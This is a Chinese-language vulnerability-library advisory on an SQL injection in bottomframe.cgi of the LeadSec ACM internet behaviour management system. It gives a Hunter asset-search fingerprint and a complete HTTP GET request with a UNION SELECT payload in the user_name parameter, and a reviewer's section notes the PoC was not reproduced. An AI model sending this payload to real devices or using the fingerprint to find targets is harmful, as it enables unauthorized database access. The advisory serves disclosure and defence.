---
source: "wy876 漏洞文库"
id: "vw-006171679b542dfb1dd5966d"
entity_id: "ve-006171679b542dfb1dd5966d"
schema_version: "1"
fofa_unverified: "app.name="
title: "网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞"
product: "LeadSec网御ACM上网行为管理"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无cookie请求，版本/auth未定义"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87/%E7%BD%91%E5%BE%A1%E6%98%9F%E4%BA%91/%E7%BD%91%E5%BE%A1ACM%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Fbottomframe.cgiSQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/us2xh5hyekelzowk"
source_status: "recorded"
---

# 网御 ACM 上网行为管理系统bottomframe.cgi SQL 注入漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：LeadSec网御ACM上网行为管理
- 本文讨论：bottomframe.cgi user_name UNION注入
- 版本、权限与配置前提：无cookie请求，版本/auth未定义
- 资料类型：SQL注入请求摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 只有user()请求無响应或数据库证明；fofa实际Hunter残缺字段
- 无厂商来源与固定版本
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 本篇未提供足以确认无副作用的完整验证流程；应依正文所述配置、权限与交互前提评估，不能把通告或截图当成可直接运行的检测脚本

### 待核与来源

- 实际数据库、认证和固件范围待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
网御上网行为管理系统具备一体化网络接入、认证、管控、优化、审计、运营等功能,是新一代高性能的上网行为管理产品。面向政府、军工、金融、教育、企业等多行业不同客户网络业务场景，简化管理，节约客户成本，提供业务效率和价值。网御ACM上网行为管理系统存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。

# 二、影响版本
+ 网御上网行为管理系统

# 三、资产测绘
+ hunter：`app.name="LeadSec 网御星云 ACM"`


+ 登录页面


# 四、漏洞复现
```http
GET /bottomframe.cgi?user_name=%27))%20union%20select%20user()%23 HTTP/1.1
Host: xx.xx.xx.xx
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/116.0
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/us2xh5hyekelzowk>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
